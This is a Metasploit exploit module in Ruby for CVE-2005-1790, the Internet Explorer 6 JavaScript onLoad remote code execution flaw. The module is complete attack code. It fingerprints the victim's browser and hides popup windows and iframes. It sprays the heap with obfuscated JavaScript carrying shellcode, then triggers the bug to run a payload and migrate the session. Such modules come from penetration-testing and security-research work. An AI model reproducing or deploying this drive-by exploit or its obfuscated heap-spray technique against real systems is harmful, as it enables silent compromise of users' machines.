# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                This bug is triggered when the browser handles a JavaScript &#039;onLoad&#039; handler in
                conjunction with an improperly initialized &#039;window()&#039; JavaScript function.
                This exploit results in a call to an address lower than the heap. The javascript
                prompt() places our shellcode near where the call operand points to.  We call
                prompt() multiple times in separate iframes to place our return address.
                We hide the prompts in a popup window behind the main window. We spray the heap
                a second time with our shellcode and point the return address to the heap. I use
                a fairly high address to make this exploit more reliable. IE will crash when the
                exploit completes.  Also, please note that Internet Explorer must allow popups
                in order to continue exploitation.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Benjamin Tobias Franz&#039;, # Discovery
                    &#039;Stuart Pearson&#039;,        # Proof of Concept
                    &#039;Sam Sharps&#039;             # Metasploit port
                ],
            &#039;References&#039;     =>
                [
                    [&#039;MSB&#039;, &#039;MS05-054&#039;],
                    [&#039;CVE&#039;, &#039;2005-1790&#039;],
                    [&#039;OSVDB&#039;, &#039;17094&#039;],
                    [&#039;URL&#039;, &#039;http://www.securityfocus.com/bid/13799/info&#039;],
                    [&#039;URL&#039;, &#039;http://www.cvedetails.com/cve/CVE-2005-1790&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;Compat&#039;   =>
                        {
                            &#039;ConnectionType&#039; => &#039;-find&#039;,
                        },
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Internet Explorer 6 on Windows XP&#039;, { &#039;iframes&#039; => 4 } ],
                    [ &#039;Internet Explorer 6 Windows 2000&#039;,  { &#039;iframes&#039; => 8 } ],
                ],
            &#039;DisclosureDate&#039; => &#039;Nov 21 2005&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def exploit
        @var_redir = rand_text_alpha(rand(100)+1)
        super
    end
 
    def auto_target(cli, request)
        mytarget = nil
 
        agent = request.headers[&#039;User-Agent&#039;]
        print_status("Checking user agent: #{agent}")
 
        if (agent =~ /MSIE 6\.0/ && agent =~ /Windows NT 5\.1/)
            mytarget = targets[0]   # IE6 on XP
        elsif (agent =~ /MSIE 6\.0/ && agent =~ /Windows NT 5\.0/)
            mytarget = targets[1]   # IE6 on 2000
        else
            print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
        end
 
        mytarget
    end
 
 
    def on_request_uri(cli, request)
        mytarget   = auto_target(cli, request)
        var_title  = rand_text_alpha(rand(100) + 1)
        func_main  = rand_text_alpha(rand(100) + 1)
 
        heapspray = ::Rex::Exploitation::JSObfu.new %Q|
function heapspray()
{
    shellcode = unescape(&#039;#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}&#039;);
    var bigblock = unescape("#{Rex::Text.to_unescape(make_nops(4))}");
    var headersize = 20;
    var slackspace = headersize + shellcode.length;
    while (bigblock.length < slackspace) bigblock += bigblock;
    var fillblock = bigblock.substring(0,slackspace);
    var block = bigblock.substring(0,bigblock.length - slackspace);
    while (block.length + slackspace < 0x40000) block = block + block + fillblock;
    var memory = new Array();
    for (i = 0; i < 250; i++){ memory[i] = block + shellcode }
 
    var ret = "";
    var fillmem = "";
 
    for (i = 0; i < 500; i++)
        ret += unescape("%u0F0F%u0F0F");
    for (i = 0; i < 200; i++)
        fillmem += ret;
 
    prompt(fillmem, "");
}
|
        heapspray.obfuscate
 
        nofunc = ::Rex::Exploitation::JSObfu.new %Q|
 
if (document.location.href.indexOf("#{@var_redir}") == -1)
{
    var counter = 0;
 
 
    top.consoleRef = open(&#039;&#039;,&#039;BlankWindow&#039;,
    &#039;width=100,height=100&#039;
    +&#039;,menubar=0&#039;
    +&#039;,toolbar=1&#039;
    +&#039;,status=0&#039;
    +&#039;,scrollbars=0&#039;
    +&#039;,left=1&#039;
    +&#039;,top=1&#039;
    +&#039;,resizable=1&#039;)
    self.focus()
 
 
    for (counter = 0; counter < #{mytarget[&#039;iframes&#039;]}; counter++)
    {
        top.consoleRef.document.writeln(&#039;<iframe width=1 height=1 src=&#039;+document.location.href+&#039;?p=#{@var_redir}</iframe>&#039;);
    }
    document.writeln("<body onload=\\"setTimeout(&#039;#{func_main}()&#039;,6000)\\">");
 
}
else
{
    #{heapspray.sym(&#039;heapspray&#039;)}();
}
|
 
        nofunc.obfuscate
 
        main = %Q|
function #{func_main}()
{
    document.write("<TITLE>#{var_title}</TITLE>");
    document.write("<body onload=window();>");
 
    window.location.reload();
}
|
 
        html = %Q|
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
<meta http-equiv="Content-Language" content="en-gb">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script>
#{nofunc}
#{heapspray}
#{main}
</script>
</head>
<body>
</body>
</html>
|
 
        print_status("Sending #{self.name} to client #{cli.peerhost}")
        send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039;, &#039;Pragma&#039; => &#039;no-cache&#039; })
 
        # Handle the payload
        handler(cli)
    end
end



